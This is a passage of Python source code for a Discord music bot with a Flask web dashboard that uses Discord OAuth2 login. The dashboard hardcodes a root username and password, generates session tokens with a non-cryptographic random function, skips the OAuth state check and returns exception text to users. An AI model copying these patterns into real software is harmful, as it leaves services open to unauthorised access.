                ),
                discord.Color.green()
            )
        else:
            await send_embed(
                ctx,
                MUSIC_LANGUAGES_TEXTS[language]["duplicate_track"],
                MUSIC_LANGUAGES_TEXTS[language]["playlist_no_new_tracks"],
                discord.Color.orange()
            )

    except Exception as e:
        print(f"Error: {e}")
        await send_embed(
            ctx,
            MUSIC_LANGUAGES_TEXTS[language]["error"],
            MUSIC_LANGUAGES_TEXTS[language]["error_fetch_audio"],
            discord.Color.red()
        )
    finally:
        if process_message:
            try:
                await process_message.delete()
            except Exception:
                pass

async def play_next(ctx):
    global current_track, start_time, progress_message

    language = get_language(ctx.guild.id)
    guild_id = str(ctx.guild.id)
    download_path = f'workspace/downloaded_music/{guild_id}'

    if update_progress.is_running():
        update_progress.stop()

    if loop_mode == 1 and current_track:
        queue.appendleft(current_track)
    elif loop_mode == 2 and current_track:
        queue.append(current_track)

    if not queue:
        current_track = None
        await send_embed(
            ctx, 
            MUSIC_LANGUAGES_TEXTS[language]["queue_title"], 
            MUSIC_LANGUAGES_TEXTS[language]["queue_empty"], 
            discord.Color.blue()
        )
        return

    current_track = queue.popleft()
    start_time = time.time()

    try:
        source = discord.FFmpegPCMAudio(current_track["file_path"], **FFMPEG_OPTIONS)
        ctx.voice_client.play(
            source,
            after=lambda _: asyncio.run_coroutine_threadsafe(play_next(ctx), bot.loop)
        )

        progress_message = await send_playing_embed(ctx, current_track)

        await asyncio.sleep(1)
        if not update_progress.is_running():
            try:
                update_progress.start(ctx)
            except RuntimeError as e:
                print(f"Error starting progress update: {e}")

    except Exception as e:
        print(f"Error playing next track: {e}")
        await send_embed(
            ctx,
            MUSIC_LANGUAGES_TEXTS[language]["error"], 
            MUSIC_LANGUAGES_TEXTS[language]["error_fetch_audio"], 
            discord.Color.red()
        )

@bot.command(name='stop')
async def stop(ctx):
    global queue, current_track

    language = get_language(ctx.guild.id)

    queue.clear()
    current_track = None

    if ctx.voice_client:
        if ctx.voice_client.is_playing():
            ctx.voice_client.stop()
            await send_embed(
                ctx,
                MUSIC_LANGUAGES_TEXTS[language]["music_stopped"],
                MUSIC_LANGUAGES_TEXTS[language]["queue_cleared"],
                discord.Color.blue()
            )
        else:
            await send_embed(
                ctx,
                MUSIC_LANGUAGES_TEXTS[language]["error"],
                MUSIC_LANGUAGES_TEXTS[language]["queue_empty"],
                discord.Color.red()
            )

        await ctx.voice_client.disconnect()
        await send_embed(
            ctx,
            MUSIC_LANGUAGES_TEXTS[language]["disconnected"],
            MUSIC_LANGUAGES_TEXTS[language]["bot_left_channel"],
            discord.Color.purple()
        )
    else:
        await send_embed(
            ctx,
            MUSIC_LANGUAGES_TEXTS[language]["error"],
            MUSIC_LANGUAGES_TEXTS[language]["error_invalid_spotify_url"],
            discord.Color.red()
        )

@bot.command(name='loop')
async def loop(ctx, mode: str):
    global loop_mode
    modes = {"off": 0, "track": 1, "queue": 2}
    if mode.lower() not in modes:
        await send_embed(ctx, "error", "invalid_loop_mode", discord.Color.red())
        return
    loop_mode = modes[mode.lower()]
    mode_text = MUSIC_LANGUAGES_TEXTS[get_language(ctx.guild.id)].get(f"loop_{mode.lower()}", mode.capitalize())
    await send_embed(ctx, "loop_mode", f"Loop mode set to: **{mode_text}**.", discord.Color.green())

@bot.command(name='skip')
async def skip(ctx):
    global current_track

    language = get_language(ctx.guild.id)

    if not ctx.voice_client or not ctx.voice_client.is_playing():
        await send_embed(
            ctx,
            MUSIC_LANGUAGES_TEXTS[language]["error"],
            MUSIC_LANGUAGES_TEXTS[language]["queue_empty"],
            discord.Color.red()
        )
        return

    await send_embed(
        ctx,
        MUSIC_LANGUAGES_TEXTS[language]["skip_success"],
        MUSIC_LANGUAGES_TEXTS[language]["skip_message"].format(track_title=current_track["title"]),
        discord.Color.blue()
    )
    ctx.voice_client.stop()

@bot.event
async def on_voice_state_update(member, before, after):
    voice_client = discord.utils.get(bot.voice_clients, guild=member.guild)

    if voice_client and before.channel is not None and after.channel is None and member == bot.user:
        guild_id = str(member.guild.id)
        guild_path = f'workspace/downloaded_music/{guild_id}'
        await asyncio.sleep(1)
        await voice_client.disconnect()
        queue.clear()
        if os.path.exists(guild_path):
            shutil.rmtree(guild_path)
    
    if voice_client and before.channel is not None:
        if len(voice_client.channel.members) == 1 and voice_client.channel.members[0] == bot.user:
            await asyncio.sleep(10)
            if len(voice_client.channel.members) == 1:
                guild_id = str(member.guild.id)
                guild_path = f'workspace/downloaded_music/{guild_id}'
                await voice_client.disconnect()
                queue.clear()
                if os.path.exists(guild_path):
                    shutil.rmtree(guild_path)

''' ----- Music Bot ----- '''
#
#
#
''' ----- HTML Web ----- '''

app = Flask(__name__, template_folder="../web", static_folder="../web")
app.secret_key = os.urandom(24)

# Discord and OAuth2 configuration
CLIENT_ID = os.getenv('DISCORD_CLIENT_ID')
CLIENT_SECRET = os.getenv('DISCORD_CLIENT_SECRET')
REDIRECT_URI = os.getenv('REDIRECT_URI')
SCOPE = 'identify'
DISCORD_BASE_URL = 'https://discord.com/api'

# Utility functions
def generate_token(length=16):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0]
    else:
        return request.remote_addr

def generate_oauth2_url():
    return f"{DISCORD_BASE_URL}/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope={SCOPE}"

def exchange_code_for_token(code):
    data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI,
        'scope': SCOPE,
    }
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    response = requests.post(f"{DISCORD_BASE_URL}/oauth2/token", data=data, headers=headers)
    response.raise_for_status()
    return response.json()

def get_user_info(token):
    headers = {'Authorization': f"Bearer {token}"}
    response = requests.get(f"{DISCORD_BASE_URL}/users/@me", headers=headers)
    response.raise_for_status()
    return response.json()

@app.route('/')
def home():
    session['user_ip'] = get_client_ip()
    user = session.get('user')
    print("Session user:", user)
    return render_template('home.html', user=user)

@app.route('/authorize')
def authorize(): 
    return redirect(generate_oauth2_url())

@app.route('/generate-access-token', methods=['POST'])
def generate_access_token():
    token = generate_token()
    session['access_token'] = token
    return {"token": token}

@app.route('/callback')
def callback():
    code = request.args.get('code')
    if not code:
        return "Authorization failed: No code provided.", 400

    try:
        token_response = exchange_code_for_token(code)
        access_token = token_response.get('access_token')
        user_info = get_user_info(access_token)
        
        if user_info:
            session['user'] = user_info 
            print("Session user set:", session['user'])
        
        return redirect(url_for('home'))
    except Exception as e:
        return f"Authorization failed: {str(e)}", 500

@app.route('/logout')
def logout():
    session.pop('user', None)
    return redirect(url_for('home'))

TOKEN_EXPIRATION_MINUTES = 30
@app.route('/validate-credentials', methods=['POST'])
def validate_credentials():
    username = request.form.get('username')
    password = request.form.get('password')

    if username == 'root' and password == 'tiger--badly@@12##':
        access_token = generate_token()
        session['access_token'] = access_token
        session['token_expiration'] = (datetime.now() + timedelta(minutes=TOKEN_EXPIRATION_MINUTES)).replace(tzinfo=None)
        return jsonify({"success": True, "access_token": access_token})
    else:
        return jsonify({"success": False})

@app.route('/dashboard-developers')
def dashboard_developers():
    token = request.args.get('access_token')
    
    if 'access_token' not in session or session['access_token'] != token:
        return redirect(url_for('home'))

    if 'token_expiration' in session:
        if datetime.now(pytz_timezone.utc) > session['token_expiration']:
            session.pop('access_token', None)
            session.pop('token_expiration', None)
            return redirect(url_for('home'))
    
    return render_template('dashboard_developers/dashboard-developers.html')

def get_headers():
    return {"Authorization": f"Bot {TOKEN}"}

def web_run():
    app.run(host='0.0.0.0', port=8080)

if __name__ == "__main__":
 flask_thread = Thread(target=web_run)
 flask_thread.start()

''' ----- HTML Web ----- '''
#
#
#
''' ----- Run bot ----- '''
async def main():
    async with bot:
        await bot.start(TOKEN)
''' ----- Run bot ----- '''

asyncio.run(main())
